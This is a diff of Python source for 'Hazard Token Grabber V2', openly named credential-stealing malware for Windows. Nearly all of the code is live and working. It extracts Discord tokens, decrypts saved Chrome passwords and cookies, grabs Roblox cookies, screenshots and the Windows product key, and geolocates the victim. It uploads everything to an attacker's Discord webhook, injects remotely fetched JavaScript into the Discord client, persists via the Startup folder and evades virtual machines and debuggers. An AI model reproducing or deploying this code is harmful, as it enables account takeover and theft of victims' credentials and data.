@@ -1,3 +1,4 @@
+
 import os
 import json
 import httpx
@@ -13,7 +14,6 @@ import subprocess
 
 from sys import argv
 from PIL import ImageGrab
-from random import choice
 from base64 import b64decode
 from tempfile import mkdtemp
 from re import findall, match
@@ -21,10 +21,10 @@ from Crypto.Cipher import AES
 from win32crypt import CryptUnprotectData
 
 config = {
-    # replace WEBHOOK_HERE with your webhook ↓↓ or use the api from https://github.com/Rdimo/Discord-Webhook-Protector
-    # Recommend using https://github.com/Rdimo/Discord-Webhook-Protector so your webhook can't be spammed or deleted
+    # replace WEBHOOK_HERE with your webhook (or your domain from the webhook protector API)
+    # Recommend using https://github.com/Rdimo/Discord-Webhook-Protector so your webhook can't be spammed or deleted 
     'webhook': "WEBHOOK_HERE",
-    # ONLY HAVE THE BASE32 ENCODED KEY HERE IF YOU'RE USING https://github.com/Rdimo/Discord-Webhook-Protector
+    # [!] ONLY HAVE THE BASE32 ENCODED KEY HERE IF YOU'RE USING https://github.com/Rdimo/Discord-Webhook-Protector [!]
     'webhook_protector_key': "KEY_HERE",
     # keep it as it is unless you want to have a custom one
     'injection_url': "https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js",
@@ -72,16 +72,13 @@ config = {
     ]
 
 }
-# global variables
 Victim = os.getlogin()
 Victim_pc = os.getenv("COMPUTERNAME")
-ram = str(psutil.virtual_memory()[0]/1024 ** 3).split(".")[0]
-disk = str(psutil.disk_usage('/')[0]/1024 ** 3).split(".")[0]
 
 
-class Functions(object):
+class functions(object):
     @staticmethod
-    def get_headers(token: str = None):
+    def getHeaders(token: str = None):
         headers = {
             "Content-Type": "application/json",
         }
@@ -113,20 +110,19 @@ class Functions(object):
             return "Failed to decrypt password"
 
     @staticmethod
-    def fetch_conf(e: str) -> str or bool | None:
+    def fetchConf(e: str) -> str or bool | None:
         return config.get(e)
 
 
-class HazardTokenGrabberV2(Functions):
+class Hazard_Token_Grabber_V2(functions):
     def __init__(self):
-        self.webhook = self.fetch_conf('webhook')
-        self.discordApi = "https://discord.com/api/v9/users/@me"
+        self.webhook = self.fetchConf('webhook')
+        self.baseurl = "https://discord.com/api/v9/users/@me"
         self.appdata = os.getenv("localappdata")
         self.roaming = os.getenv("appdata")
-        self.chrome = self.appdata + "\\Google\\Chrome\\User Data\\"
         self.dir = mkdtemp()
-        self.startup_loc = self.roaming + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
-        self.hook_reg = "api/webhooks"
+        self.startup_loc = self.roaming + \
+            "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
         self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
         self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
 
@@ -147,8 +143,8 @@ class HazardTokenGrabberV2(Functions):
     async def checkToken(self, tkn: str) -> str:
         try:
             r = httpx.get(
-                url=self.discordApi,
-                headers=self.get_headers(tkn),
+                url=self.baseurl,
+                headers=self.getHeaders(tkn),
                 timeout=5.0
             )
         except (httpx._exceptions.ConnectTimeout, httpx._exceptions.TimeoutException):
@@ -157,21 +153,23 @@ class HazardTokenGrabberV2(Functions):
             self.tokens.append(tkn)
 
     async def init(self):
-        if self.fetch_conf('anti_debug') and AntiDebug().inVM:
-            os._exit(0)
+        if self.fetchConf('anti_debug'):
+            if AntiDebug().inVM:
+                os._exit(0)
         await self.bypassBetterDiscord()
         await self.bypassTokenProtector()
-        function_list = [self.screenshot, self.grab_tokens, self.grabRobloxCookie]
-        if self.fetch_conf('hide_self'):
+        function_list = [self.screenshot, self.grabTokens,
+                         self.grabRobloxCookie]
+        if self.fetchConf('hide_self'):
             function_list.append(self.hide)
 
-        if self.fetch_conf('kill_processes'):
+        if self.fetchConf('kill_processes'):
             await self.killProcesses()
 
-        if self.fetch_conf('startup'):
+        if self.fetchConf('startup'):
             function_list.append(self.startup)
 
-        if os.path.exists(self.chrome+'Default') and os.path.exists(self.chrome+'Local State'):
+        if os.path.exists(self.appdata+'\\Google\\Chrome\\User Data\\Default') and os.path.exists(self.appdata+'\\Google\\Chrome\\User Data\\Local State'):
             function_list.append(self.grabPassword)
             function_list.append(self.grabCookies)
 
@@ -213,22 +211,20 @@ class HazardTokenGrabberV2(Functions):
                                         inj_path+'initiation', exist_ok=True)
                                 except PermissionError:
                                     pass
-                            if self.hook_reg in self.webhook:
-                                f = httpx.get(self.fetch_conf('injection_url')).text.replace("%WEBHOOK%", self.webhook)
+                            if "api/webhooks" in self.webhook:
+                                f = httpx.get(self.fetchConf('injection_url')).text.replace("%WEBHOOK%", self.webhook)
                             else:
-                                f = httpx.get(self.fetch_conf('injection_url')).text.replace(
-                                    "%WEBHOOK%", self.webhook).replace(
-                                    "%WEBHOOK_KEY%", self.fetch_conf('webhook_protector_key'))
+                                f = httpx.get(self.fetchConf('injection_url')).text.replace("%WEBHOOK%", self.webhook).replace("%WEBHOOK_KEY%", self.fetchConf('webhook_protector_key'))
                             try:
                                 with open(inj_path+'index.js', 'w', errors="ignore") as indexFile:
                                     indexFile.write(f)
                             except PermissionError:
                                 pass
-                            if self.fetch_conf('kill_processes'):
+                            if self.fetchConf('kill_processes'):
                                 os.startfile(app + self.sep + _dir + '.exe')
 
     async def killProcesses(self):
-        blackListedPrograms = self.fetch_conf('blackListedPrograms')
+        blackListedPrograms = self.fetchConf('blackListedPrograms')
         for i in ['discord', 'discordtokenprotector', 'discordcanary', 'discorddevelopment', 'discordptb']:
             blackListedPrograms.append(i)
         for proc in psutil.process_iter():
@@ -273,12 +269,13 @@ class HazardTokenGrabberV2(Functions):
             with open(config, 'w') as f:
                 json.dump(item, f, indent=2, sort_keys=True)
             with open(config, 'a') as f:
-                f.write("\n\n//Rdimo just shit on this token protector | https://github.com/Rdimo")
+                f.write(
+                    "\n\n//Rdimo just shit on this token protector | https://github.com/Rdimo")
 
     async def bypassBetterDiscord(self):
         bd = self.roaming+"\\BetterDiscord\\data\\betterdiscord.asar"
         if os.path.exists(bd):
-            x = self.hook_reg
+            x = "api/webhooks"
             with open(bd, 'r', encoding="cp437", errors='ignore') as f:
                 txt = f.read()
                 content = txt.replace(x, 'RdimoTheGoat')
@@ -288,8 +285,7 @@ class HazardTokenGrabberV2(Functions):
     def getProductValues(self):
         try:
             wkey = subprocess.check_output(
-                r"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -Name BackupProductKeyDefault",
-                creationflags=0x08000000).decode().rstrip()
+                r"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", creationflags=0x08000000).decode().rstrip()
         except Exception:
             wkey = "N/A (Likely Pirated)"
         try:
@@ -300,7 +296,7 @@ class HazardTokenGrabberV2(Functions):
         return [productName, wkey]
 
     @try_extract
-    def grab_tokens(self):
+    def grabTokens(self):
         paths = {
             'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
             'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
@@ -317,7 +313,7 @@ class HazardTokenGrabberV2(Functions):
             'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
             'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
             'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
-            'Chrome': self.chrome + 'Default\\Local Storage\\leveldb\\',
+            'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
             'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
             'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
             'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
@@ -337,7 +333,8 @@ class HazardTokenGrabberV2(Functions):
                             continue
                         for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                             for y in findall(self.encrypted_regex, line):
-                                token = self.decrypt_val(b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming+f'\\{disc}\\Local State'))
+                                token = self.decrypt_val(b64decode(
+                                    y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming+f'\\{disc}\\Local State'))
                                 asyncio.run(self.checkToken(token))
             else:
                 for file_name in os.listdir(path):
@@ -358,43 +355,50 @@ class HazardTokenGrabberV2(Functions):
 
     @try_extract
     def grabPassword(self):
-        master_key = self.get_master_key(self.chrome + 'Local State')
-        login_db = self.chrome + 'default\\Login Data'
+        master_key = self.get_master_key(
+            self.appdata+'\\Google\\Chrome\\User Data\\Local State')
+        login_db = self.appdata+'\\Google\\Chrome\\User Data\\default\\Login Data'
         login = self.dir+self.sep+"Loginvault1.db"
 
         shutil.copy2(login_db, login)
         conn = sqlite3.connect(login)
         cursor = conn.cursor()
         with open(self.dir+"\\Google Passwords.txt", "w", encoding="cp437", errors='ignore') as f:
-            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
+            cursor.execute(
+                "SELECT action_url, username_value, password_value FROM logins")
             for r in cursor.fetchall():
                 url = r[0]
                 username = r[1]
                 encrypted_password = r[2]
-                decrypted_password = self.decrypt_val(encrypted_password, master_key)
+                decrypted_password = self.decrypt_val(
+                    encrypted_password, master_key)
                 if url != "":
-                    f.write(f"Domain: {url}\nUser: {username}\nPass: {decrypted_password}\n\n")
+                    f.write(
+                        f"Domain: {url}\nUser: {username}\nPass: {decrypted_password}\n\n")
         cursor.close()
         conn.close()
         os.remove(login)
 
     @try_extract
     def grabCookies(self):
-        master_key = self.get_master_key(self.chrome + 'Local State')
-        login_db = self.chrome + 'default\\Network\\cookies'
+        master_key = self.get_master_key(
+            self.appdata+'\\Google\\Chrome\\User Data\\Local State')
+        login_db = self.appdata+'\\Google\\Chrome\\User Data\\default\\Network\\cookies'
         login = self.dir+self.sep+"Loginvault2.db"
 
         shutil.copy2(login_db, login)
         conn = sqlite3.connect(login)
         cursor = conn.cursor()
         with open(self.dir+"\\Google Cookies.txt", "w", encoding="cp437", errors='ignore') as f:
-            cursor.execute("SELECT host_key, name, encrypted_value from cookies")
+            cursor.execute(
+                "SELECT host_key, name, encrypted_value from cookies")
             for r in cursor.fetchall():
                 host = r[0]
                 user = r[1]
                 decrypted_cookie = self.decrypt_val(r[2], master_key)
                 if host != "":
-                    f.write(f"Host: {host}\nUser: {user}\nCookie: {decrypted_cookie}\n\n")
+                    f.write(
+                        f"Host: {host}\nUser: {user}\nCookie: {decrypted_cookie}\n\n")
                 if '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_' in decrypted_cookie:
                     self.robloxcookies.append(decrypted_cookie)
         cursor.close()
@@ -402,12 +406,15 @@ class HazardTokenGrabberV2(Functions):
         os.remove(login)
 
     def neatifyTokens(self):
-        f = open(self.dir+"\\Discord Info.txt", "w", encoding="cp437", errors='ignore')
+        f = open(self.dir+"\\Discord Info.txt",
+                 "w", encoding="cp437", errors='ignore')
         for token in self.tokens:
-            j = httpx.get(self.discordApi, headers=self.get_headers(token)).json()
+            j = httpx.get(
+                self.baseurl, headers=self.getHeaders(token)).json()
             user = j.get('username') + '#' + str(j.get("discriminator"))
 
             badges = ""
+            flags = j['flags']
             flags = j['flags']
             if (flags == 1):
                 badges += "Staff, "
@@ -434,10 +441,12 @@ class HazardTokenGrabberV2(Functions):
             email = j.get("email")
             phone = j.get("phone") if j.get(
                 "phone") else "No Phone Number attached"
-            nitro_data = httpx.get(self.discordApi+'/billing/subscriptions', headers=self.get_headers(token)).json()
+            nitro_data = httpx.get(
+                self.baseurl+'/billing/subscriptions', headers=self.getHeaders(token)).json()
             has_nitro = False
             has_nitro = bool(len(nitro_data) > 0)
-            billing = bool(len(json.loads(httpx.get(self.discordApi+"/billing/payment-sources", headers=self.get_headers(token)).text)) > 0)
+            billing = bool(len(json.loads(httpx.get(
+                self.baseurl+"/billing/payment-sources", headers=self.getHeaders(token)).text)) > 0)
             f.write(f"{' '*17}{user}\n{'-'*50}\nToken: {token}\nHas Billing: {billing}\nNitro: {has_nitro}\nBadges: {badges}\nEmail: {email}\nPhone: {phone}\n\n")
         f.close()
 
@@ -480,27 +489,40 @@ class HazardTokenGrabberV2(Functions):
                         os.remove(path)
                     else:
                         with open(path, "w", encoding="utf-8", errors="ignore") as f:
-                            f.write("🌟・Grabber By github.com/Rdimo・https://github.com/Rdimo/Hazard-Token-Grabber-V2\n\n")
+                            f.write(
+                                "🌟・Grabber By github.com/Rdimo・https://github.com/Rdimo/Hazard-Token-Grabber-V2\n\n")
                         with open(path, "a", encoding="utf-8", errors="ignore") as fp:
-                            fp.write(x+"\n\n🌟・Grabber By github.com/Rdimo・https://github.com/Rdimo/Hazard-Token-Grabber-V2")
-
+                            fp.write(
+                                x+"\n\n🌟・Grabber By github.com/Rdimo・https://github.com/Rdimo/Hazard-Token-Grabber-V2")
         w = self.getProductValues()
         wname = w[0].replace(" ", "᠎ ")
         wkey = w[1].replace(" ", "᠎ ")
+        ram = str(psutil.virtual_memory()[0]/1024 ** 3).split(".")[0]
+        disk = str(psutil.disk_usage('/')[0]/1024 ** 3).split(".")[0]
+        ip = "N/A"
+        city = "N/A"
+        country = "N/A"
+        region = "N/A"
+        org = "N/A"
+        loc = "N/A"
+        googlemap = "N/A"
+        for site in ["https://utilities.tk/network/info", "https://ipinfo.io/json"]:
+            data = httpx.get(site)
+            if data.status_code == 200:
+                ip = data.get('ip')
+                city = data.get('city')
+                country = data.get('country')
+                region = data.get('region')
+                org = data.get('org')
+                loc = data.get('loc')
+                googlemap = "https://www.google.com/maps/search/google+map++" + loc
+                break
+            else:
+                pass
 
-        links = ["https://ipinfo.io/json", "https://utilities.tk/network/info"]
-        link = choice(links)
-        data = httpx.get(link).json()
-
-        ip = data.get('ip')
-        city = data.get('city')
-        country = data.get('country')
-        region = data.get('region')
-        org = data.get('org')
-        loc = data.get('loc')
-        googlemap = "https://www.google.com/maps/search/google+map++" + loc
-
-        _zipfile = os.path.join(self.appdata, f'Hazard.V2-[{Victim}].zip')
+                
+        _zipfile = os.path.join(
+            self.appdata, f'Hazard.V2-[{Victim}].zip')
         zipped_file = zipfile.ZipFile(_zipfile, "w", zipfile.ZIP_DEFLATED)
         abs_src = os.path.abspath(self.dir)
         for dirname, _, files in os.walk(self.dir):
@@ -525,7 +547,7 @@ class HazardTokenGrabberV2(Functions):
                         'url': 'https://github.com/Rdimo/Hazard-Token-Grabber-V2',
                         'icon_url': 'https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Token-Grabber-V2/Small_hazard.gif'
                     },
-                    'color': 176185,
+                    'color': 16119101,
                     'description': f'[Google Maps Location]({googlemap})',
                     'fields': [
                         {
@@ -574,43 +596,29 @@ class HazardTokenGrabberV2(Functions):
             ]
         }
         with open(_zipfile, 'rb') as f:
-            if self.hook_reg in self.webhook:
+            if "api/webhooks" in self.webhook:
                 httpx.post(self.webhook, json=embed)
                 httpx.post(self.webhook, files={'upload_file': f})
             else:
                 from pyotp import TOTP
-                key = TOTP(self.fetch_conf('webhook_protector_key')).now()
+                key = TOTP(self.fetchConf('webhook_protector_key')).now()
                 httpx.post(self.webhook, headers={"Authorization": key}, json=embed)
                 httpx.post(self.webhook, headers={"Authorization": key}, files={'upload_file': f})
         os.remove(_zipfile)
 
 
-class AntiDebug(Functions):
+class AntiDebug(functions):
     inVM = False
 
     def __init__(self):
         self.processes = list()
 
-        self.blackListedUsers = [
-            "WDAGUtilityAccount", "Abby", "Peter Wilson", "hmarc", "patex", "JOHN-PC", "RDhJ0CNFevzX", "kEecfMwgj", "Frank", "8Nl0ColNQ5bq",
-            "Lisa", "John", "george", "PxmdUOpVyx", "8VizSM", "w0fjuOVmCcP5A", "lmVwjj9b", "PqONjHVwexsS", "3u2v9m8", "Julia", "HEUeRzl",
-        ]
-        self.blackListedPCNames = [
-            "BEE7370C-8C0C-4", "DESKTOP-NAKFFMT", "WIN-5E07COS9ALR", "B30F0242-1C6A-4", "DESKTOP-VRSQLAG", "Q9IATRKPRH", "XC64ZB", "DESKTOP-D019GDM",
-            "DESKTOP-WI8CLET", "SERVER1", "LISA-PC", "JOHN-PC", "DESKTOP-B0T93D6", "DESKTOP-1PYKP29", "DESKTOP-1Y2433R", "WILEYPC", "WORK", "6C4E733F-C2D9-4",
-            "RALPHS-PC", "DESKTOP-WG3MYJS", "DESKTOP-7XC6GEZ", "DESKTOP-5OV9S0O", "QarZhrdBpj", "ORELEEPC", "ARCHIBALDPC", "JULIA-PC", "d1bnJkfVlH",
-        ]
-        self.blackListedHWIDS = [
-            "7AB5C494-39F5-4941-9163-47F54D6D5016", "032E02B4-0499-05C3-0806-3C0700080009", "03DE0294-0480-05DE-1A06-350700080009",
-            "11111111-2222-3333-4444-555555555555", "6F3CA5EC-BEC9-4A4D-8274-11168F640058", "ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548",
-            "4C4C4544-0050-3710-8058-CAC04F59344A", "00000000-0000-0000-0000-AC1F6BD04972", "79AF5279-16CF-4094-9758-F88A616D81B4",
-            "5BD24D56-789F-8468-7CDC-CAA7222CC121", "49434D53-0200-9065-2500-65902500E439", "49434D53-0200-9036-2500-36902500F022",
-            "777D84B3-88D1-451C-93E4-D235177420A7", "49434D53-0200-9036-2500-369025000C65", "B1112042-52E8-E25B-3655-6A4F54155DBF",
-            "00000000-0000-0000-0000-AC1F6BD048FE", "EB16924B-FB6D-4FA1-8666-17B91F62FB37", "A15A930C-8251-9645-AF63-E45AD728C20C",
-            "67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3", "C7D23342-A5D4-68A1-59AC-CF40F735B363", "63203342-0EB0-AA1A-4DF5-3FB37DBB0670",
-            "44B94D56-65AB-DC02-86A0-98143A7423BF", "6608003F-ECE4-494E-B07E-1C4615D1D93C", "D9142042-8F51-5EFF-D5F8-EE9AE3D1602A",
-            "49434D53-0200-9036-2500-369025003AF0", "8B4E8278-525C-7343-B825-280AEBCD3BCB", "4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27",
-        ]
+        self.blackListedUsers = ["WDAGUtilityAccount", "Abby", "Peter Wilson", "hmarc", "patex", "JOHN-PC", "RDhJ0CNFevzX", "kEecfMwgj", "Frank",
+                                 "8Nl0ColNQ5bq", "Lisa", "John", "george", "PxmdUOpVyx", "8VizSM", "w0fjuOVmCcP5A", "lmVwjj9b", "PqONjHVwexsS", "3u2v9m8", "Julia", "HEUeRzl", ]
+        self.blackListedPCNames = ["BEE7370C-8C0C-4", "DESKTOP-NAKFFMT", "WIN-5E07COS9ALR", "B30F0242-1C6A-4", "DESKTOP-VRSQLAG", "Q9IATRKPRH", "XC64ZB", "DESKTOP-D019GDM", "DESKTOP-WI8CLET", "SERVER1", "LISA-PC", "JOHN-PC",
+                                   "DESKTOP-B0T93D6", "DESKTOP-1PYKP29", "DESKTOP-1Y2433R", "WILEYPC", "WORK", "6C4E733F-C2D9-4", "RALPHS-PC", "DESKTOP-WG3MYJS", "DESKTOP-7XC6GEZ", "DESKTOP-5OV9S0O", "QarZhrdBpj", "ORELEEPC", "ARCHIBALDPC", "JULIA-PC", "d1bnJkfVlH", ]
+        self.blackListedHWIDS = ["7AB5C494-39F5-4941-9163-47F54D6D5016", "032E02B4-0499-05C3-0806-3C0700080009", "03DE0294-0480-05DE-1A06-350700080009", "11111111-2222-3333-4444-555555555555", "6F3CA5EC-BEC9-4A4D-8274-11168F640058", "ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548", "4C4C4544-0050-3710-8058-CAC04F59344A", "00000000-0000-0000-0000-AC1F6BD04972", "00000000-0000-0000-0000-000000000000", "5BD24D56-789F-8468-7CDC-CAA7222CC121", "49434D53-0200-9065-2500-65902500E439", "49434D53-0200-9036-2500-36902500F022", "777D84B3-88D1-451C-93E4-D235177420A7", "49434D53-0200-9036-2500-369025000C65",
+                                 "B1112042-52E8-E25B-3655-6A4F54155DBF", "00000000-0000-0000-0000-AC1F6BD048FE", "EB16924B-FB6D-4FA1-8666-17B91F62FB37", "A15A930C-8251-9645-AF63-E45AD728C20C", "67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3", "C7D23342-A5D4-68A1-59AC-CF40F735B363", "63203342-0EB0-AA1A-4DF5-3FB37DBB0670", "44B94D56-65AB-DC02-86A0-98143A7423BF", "6608003F-ECE4-494E-B07E-1C4615D1D93C", "D9142042-8F51-5EFF-D5F8-EE9AE3D1602A", "49434D53-0200-9036-2500-369025003AF0", "8B4E8278-525C-7343-B825-280AEBCD3BCB", "4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27", "79AF5279-16CF-4094-9758-F88A616D81B4", ]
 
         for func in [self.listCheck, self.registryCheck, self.specsCheck]:
             process = threading.Thread(target=func, daemon=True)
@@ -645,7 +653,8 @@ class AntiDebug(Functions):
                 self.programExit()
 
         try:
-            myHWID = subprocess.check_output(r"wmic csproduct get uuid", creationflags=0x08000000).decode().split('\n')[1].strip()
+            myHWID = subprocess.check_output(
+                r"wmic csproduct get uuid", creationflags=0x08000000).decode().split('\n')[1].strip()
         except Exception:
             myHWID = ""
         for hwid in self.blackListedHWIDS:
@@ -653,23 +662,25 @@ class AntiDebug(Functions):
                 self.programExit()
 
     def specsCheck(self):
-        # would not recommend changing this to over 2gb since some actually have 3gb of ram
-        if int(ram) <= 2:  # 2gb or less ram
-            self.programExit()
+        disk = str(psutil.disk_usage('/')[0]/1024 ** 3).split(".")[0]
         if int(disk) <= 50:  # 50gb or less disc space
             self.programExit()
         if int(psutil.cpu_count()) <= 1:  # 1 or less cpu cores
             self.programExit()
 
     def registryCheck(self):
-        reg1 = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul")
-        reg2 = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul")
+        reg1 = os.system(
+            "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul")
+        reg2 = os.system(
+            "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul")
         if (reg1 and reg2) != 1:
             self.programExit()
 
-        handle = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 'SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum')
+        handle = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
+                                'SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum')
         try:
             reg_val = winreg.QueryValueEx(handle, '0')[0]
+
             if ("VMware" or "VBOX") in reg_val:
                 self.programExit()
         finally:
@@ -677,8 +688,4 @@ class AntiDebug(Functions):
 
 
 if __name__ == "__main__" and os.name == "nt":
-    try:
-        httpx.get('https://google.com')
-    except httpx.ConnectTimeout:
-        os._exit(0)
-    asyncio.run(HazardTokenGrabberV2().init())
+    asyncio.run(Hazard_Token_Grabber_V2().init())
